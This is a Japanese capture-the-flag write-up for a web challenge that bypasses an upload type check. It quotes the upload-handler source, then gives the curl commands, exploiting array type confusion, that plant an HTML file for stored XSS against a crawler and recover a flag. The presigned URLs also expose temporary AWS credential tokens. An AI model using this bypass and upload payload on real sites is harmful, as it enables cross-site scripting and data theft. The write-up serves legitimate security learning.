# Just included?:Validation Bypass:50pts
include  

- [Target](https://dobmbu2gvgzru.cloudfront.net/)  

**source code**  

- [Web Application](https://drive.google.com/file/d/1o82gm2U0H7vxGMYc2D12PSg_Wj4onixM/view?usp=drive_link)  

※ If no announcement is made, all "Crawler" source codes are the same.  

[https://dobmbu2gvgzru.cloudfront.net/](https://dobmbu2gvgzru.cloudfront.net/)  

# Solution
URLとアプリケーションのソースが渡される。  
クローラは[Server Side Upload](../Server_Side_Upload)と同様なようだ。  
ファイルアップロードサイトも同じなようだ。  
![site.png](site/site.png)  
ソースの主要部分は以下であった。  
```ts
~~~
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  if (request.body.contentType.includes(';')) {
    return reply.code(400).send({ error: 'No file type (only type/subtype)' });
  }

  const allow = new RegExp('image/(jpg|jpeg|png|gif)$');
  if (!allow.test(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: request.body.contentType,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type', 'content-length']),
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
~~~
```
初めにファイルの`contentType`を`includes(';')`でチェックし、charsetのテクニックを防いでいる。  
その後に正規表現`'image/(jpg|jpeg|png|gif)$'`でチェックしている。  
一見するとバイパスできそうになさそうだ。  
ここで`contentType`に配列を指定することを思いつく。  
以下の通りチェックしてみる。  
```bash
$ node
~~~
> ["text/html; charset=image/png"].includes(";")
false
> const allow = new RegExp('image/(jpg|jpeg|png|gif)$');
undefined
> allow.test(["text/html; charset=image/png"])
true
```
ともにバイパスできそうだ。  
以下のように行う(Server Side Uploadと同じHTMLを利用)。  
```bash
$ curl -X POST -H 'Content-Type: application/json' -d '{"contentType":["text/html; charset=image/png"],"length":221}' --upload-file xs3.html 'https://dobmbu2gvgzru.cloudfront.net/api/upload'
{"url":"https://uploadbucket-5b1bc63390-4-2-upload.s3.ap-northeast-1.amazonaws.com/upload/2784d4d0-e75e-4868-b6fa-afd321254ee0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4MOINIEPL%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T050343Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEM3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkcwRQIgC5aCon3izBVvwCEMlQNJxKgvVh%2F0HRKUsuitn8tnmEwCIQCfaaogS85upszjaqw%2FjT7iNO1kVklV0gL2umBNhzso0iq7Awjm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAEaDDMwODUyMTQwNzczNiIMLZ4vvDTZeS%2BaO2nIKo8DCnfng5PZextFyoJ6RMagGk5CWvNREHoOvDS%2B1SEpcjehyiWKARhaD%2BO8CqY5zfApEn8B4X9F%2F5vUu5nmTuGFZXfFeYxg44yMWFMLtKik%2B7%2F7A7EDgWw1MBCRNcJggKekvgEGjsBhuzd7s8CFv2%2FaqeZVNa3s22ACMkFVlpDf40V0WUk%2FyrD18Mq1teGbMvw5%2B%2BLroF0K4Vdktv1CtcbhUsoBS%2FjDuYUF5Qh1ZpmBN%2FTMiTLvE1AChh9Hro8IPe7yMvTxzzwP5UMGgJjx4kkH5g%2FKiL%2Fd5YQq0l6jTGC63y9JSQOrKjcBuPFJmotsU9cmQUr8llfAVdNgveQcP%2BquAQ%2F%2FxVg1KH7X%2BzrmJa6cOtZCwXLHlRQ1gIUArAHmzuOX1Tpb%2FTLztkr%2BwkSVoFsi7XJMl7Z%2B05%2Favxf03QFPu7wwDIXFQ0gcz9oPp%2FtpiGP8ueD3REttbNz3kCb%2BsPZNtY5Nxf0elNUXgmlnBgiFdaNzf8FJgrPDw3p0Pk8GoK%2FTh4k%2FwHdrXOFSmbJje2GwMIeXmbAGOp4B0PEWh9OWOoa68W%2Fz0aPxRyr3aFEcMrA7BlXH7lys43pRr6sfOEpg718YLtVAR33EroFNRS%2BubEyWfJt41YAziAfYkWR0xSJjiZoir9GwacqDkA0wie%2F9eSN4eWEGtJMo9CcM9rqqyVJElduq8XM0U9PVkZKKk1a2H25c1OUpcBxrAuEuo%2FeTKT8vim9qoj8ik8Q3FpUVdPxfpEqfTD0%3D&X-Amz-Signature=e3e45c1013668b7c1509ab9139f8a66d76414dcdda8164348781918e29a9296d&X-Amz-SignedHeaders=content-length%3Bhost&x-id=PutObject","filename":"2784d4d0-e75e-4868-b6fa-afd321254ee0"}
$ curl -X PUT -H 'Content-Type: text/html; charset=image/png' --upload-file xs3.html 'https://uploadbucket-5b1bc63390-4-2-upload.s3.ap-northeast-1.amazonaws.com/upload/2784d4d0-e75e-4868-b6fa-afd321254ee0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4MOINIEPL%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T050343Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEM3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkcwRQIgC5aCon3izBVvwCEMlQNJxKgvVh%2F0HRKUsuitn8tnmEwCIQCfaaogS85upszjaqw%2FjT7iNO1kVklV0gL2umBNhzso0iq7Awjm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAEaDDMwODUyMTQwNzczNiIMLZ4vvDTZeS%2BaO2nIKo8DCnfng5PZextFyoJ6RMagGk5CWvNREHoOvDS%2B1SEpcjehyiWKARhaD%2BO8CqY5zfApEn8B4X9F%2F5vUu5nmTuGFZXfFeYxg44yMWFMLtKik%2B7%2F7A7EDgWw1MBCRNcJggKekvgEGjsBhuzd7s8CFv2%2FaqeZVNa3s22ACMkFVlpDf40V0WUk%2FyrD18Mq1teGbMvw5%2B%2BLroF0K4Vdktv1CtcbhUsoBS%2FjDuYUF5Qh1ZpmBN%2FTMiTLvE1AChh9Hro8IPe7yMvTxzzwP5UMGgJjx4kkH5g%2FKiL%2Fd5YQq0l6jTGC63y9JSQOrKjcBuPFJmotsU9cmQUr8llfAVdNgveQcP%2BquAQ%2F%2FxVg1KH7X%2BzrmJa6cOtZCwXLHlRQ1gIUArAHmzuOX1Tpb%2FTLztkr%2BwkSVoFsi7XJMl7Z%2B05%2Favxf03QFPu7wwDIXFQ0gcz9oPp%2FtpiGP8ueD3REttbNz3kCb%2BsPZNtY5Nxf0elNUXgmlnBgiFdaNzf8FJgrPDw3p0Pk8GoK%2FTh4k%2FwHdrXOFSmbJje2GwMIeXmbAGOp4B0PEWh9OWOoa68W%2Fz0aPxRyr3aFEcMrA7BlXH7lys43pRr6sfOEpg718YLtVAR33EroFNRS%2BubEyWfJt41YAziAfYkWR0xSJjiZoir9GwacqDkA0wie%2F9eSN4eWEGtJMo9CcM9rqqyVJElduq8XM0U9PVkZKKk1a2H25c1OUpcBxrAuEuo%2FeTKT8vim9qoj8ik8Q3FpUVdPxfpEqfTD0%3D&X-Amz-Signature=e3e45c1013668b7c1509ab9139f8a66d76414dcdda8164348781918e29a9296d&X-Amz-SignedHeaders=content-length%3Bhost&x-id=PutObject'
```
エラーとならないため、ファイル名からURLを`https://dobmbu2gvgzru.cloudfront.net/upload/2784d4d0-e75e-4868-b6fa-afd321254ee0`と構成してクローラに投げる。  
以下のリクエストが届く。  
```
GET
/?satoki=flag=flag{acc9b4786f6bf003a75f32b5607c92530dcf6b9f}
```
flagが得られた。  

## flag{acc9b4786f6bf003a75f32b5607c92530dcf6b9f}